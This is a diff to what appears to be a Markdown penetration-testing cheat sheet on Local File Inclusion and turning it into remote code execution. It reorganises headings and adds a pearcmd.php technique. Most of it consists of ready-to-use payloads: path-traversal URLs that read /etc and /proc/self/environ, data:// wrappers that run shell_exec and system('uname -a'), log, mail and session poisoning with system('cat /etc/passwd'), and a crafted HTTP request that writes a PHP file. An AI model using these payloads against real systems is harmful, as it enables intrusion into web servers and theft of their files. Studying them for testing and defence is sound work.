@@ -72,6 +72,14 @@ Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/
 - [Zip slip](Insecure%20File%20Upload.md#Zip%20slip)
 
 
+### Using /proc/self/ to enumerate the process
+
+```bash
+http://10.11.0.22/menu.php?file=../../../../../../proc/self/cmdline      # Cmd line used to execute the process
+http://10.11.0.22/menu.php?file=../../../../../../proc/self/environ      # Enviroment variables for the current process
+http://10.11.0.22/menu.php?file=../../../../../../proc/self/cwd          # Current working directory for the current process
+```
+
 ### PHP wrappers and filters
 
 They are meta-protocols used by the language to process info other than the HTTP protocol. They could be useful to bypass a whitelist defense in XPath - LFI/RFI exploitation.
@@ -127,13 +135,16 @@ POST DATA: <?php system('id'); ?>
 
 ![](../../zzz_res/attachments/LFI-file_wrapper.png)
 
-Shell using wrappers:
+#### LFI2RCE using basic wrappers
 
 ```php
 http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
 ```
 
-**LFI2RCE using wrappers without including any file:** [^1]
+#### LFI2RCE using PHP filters chain
+
+>[!tldr]
+>LFI2RCE using wrappers without including any file [^1]
 
 [^1]: https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d
 
@@ -155,7 +166,7 @@ Reference: https://infosecwriteups.com/sql-injection-to-lfi-to-rce-536bed29a862
 
 1. File at https://customer.com/php/load.php
 ```php
-Warning: invlude (/php/.php) failed to open stream: no such file
+Warning: include (/php/.php) failed to open stream: no such file
 ...
 ```
 
@@ -165,19 +176,11 @@ Warning: invlude (/php/.php) failed to open stream: no such file
 5. [Remote Code Execution (RCE)](Remote%20Code%20Execution%20(RCE).md) using PHP wrappers: `https://customer.com/php/load.php?page=' /*!50000union*/ select 1,2,3,4,5,6,7,8,’data://text/plain,<?php $a=”sy”;$b=”stem”;$c=$a.$b; $c(“uname -a”);?>’ -- -`
 
 
-### Using /proc/self/ to enumerate the process
-
-```bash
-http://10.11.0.22/menu.php?file=../../../../../../proc/self/cmdline      # Cmd line used to execute the process
-http://10.11.0.22/menu.php?file=../../../../../../proc/self/environ      # Enviroment variables for the current process
-http://10.11.0.22/menu.php?file=../../../../../../proc/self/cwd          # Current working directory for the current process
-```
-
-## Contaminating Log Files - from LFI to RCE
+### Contaminating Log Files - from LFI to RCE
 
 It is possible to **contaminate various service's log** in order to **cause them to contain PHP code**, which once included will be execute.
 
-### Apache log file
+#### Apache log file
 
 Inject the payload within Apache logs (`/var/log/apache2/access.log`):
 
@@ -197,7 +200,7 @@ Final payload to include the shell:
 http://192.168.1.66/funcion.php?name=a&comment=b&cmd=ipconfig&VULN=../../../../../../../xampp/apache/logs/access.log%00
 ```
 
-### Via Email
+#### Via Email
 
 Send a mail to a internal account (user@localhost) containing
 
@@ -211,7 +214,7 @@ and access to the mail
 /var/mail/USER&cmd=whoami
 ```
 
-### Via `/proc/*/fd/*`
+#### Via `/proc/*/fd/*`
 
 1. Upload a lot of shells (for example : 100)
 2. Include
@@ -222,7 +225,7 @@ http://example.com/index.php?page=/proc/$PID/fd/$FD
 
 with `$PID` = PID of the process (can be brute forced) and `$FD` the file descriptor (can be brute forced too)
 
-### Via `/proc/self/environ`
+#### Via `/proc/self/environ`
 
 Like a log file, send the payload in the User-Agent, it will be reflected inside the `/proc/self/environ` file.
 
@@ -231,7 +234,7 @@ GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
 User-Agent: <?=phpinfo(); ?>
 ```
 
-### Via PHP sessions
+#### Via PHP sessions
 
 In PHP these sessions are stored into `/var/lib/php5/sess_[PHPSESSID]` files.
 
@@ -246,9 +249,33 @@ login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
 login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
 ```
 
-### Via vsftpd logs
+#### Via vsftpd logs
 
 The logs of this FTP server are stored in `/var/log/vsftpd.log`. If you have a LFI and can access a exposed vsftpd server, you could try to login setting the PHP payload in the username and then access the logs using the LFI.
+
+### LFI2RCE using `pearcmd.php` without file upload [^pearcmd]
+
+[^pearcmd]: [Clever use of `pearcmd.php`](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp)
+
+Sometimes LFI can still be upgraded to RCE even if logs are not accessible and file upload is not allowed, thanks to `pearcmd.php`. 
+
+>[!info]
+>pecl is a command line tool used in PHP to manage extensions, and pear is a class library that pecl depends on. In 7.3 and before, pecl/pear is installed by default; in 7.4 and after, we need to specify it when compiling PHP to `--with-pear`install it. However, in any version of Docker image, pcel/pear will be installed by default, and the installation path is `/usr/local/lib/php`.
+
+Assuming `file` is the parameter vulnerable to LFI, we can generate a valid PHP file to be included later using the method below:
+```http
+GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
+Host: 192.168.1.162:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Connection: close
+```
+
+By sending this packet, the target will write a file `/tmp/hello.php`containing `<?=phpinfo()?>` [^video]
+
+[^video]: [Website Vulnerabilities to Fully Hacked Server](https://www.youtube.com/watch?v=yq2rq50IMSQ&ab_channel=JohnHammond)
 
 ---
 
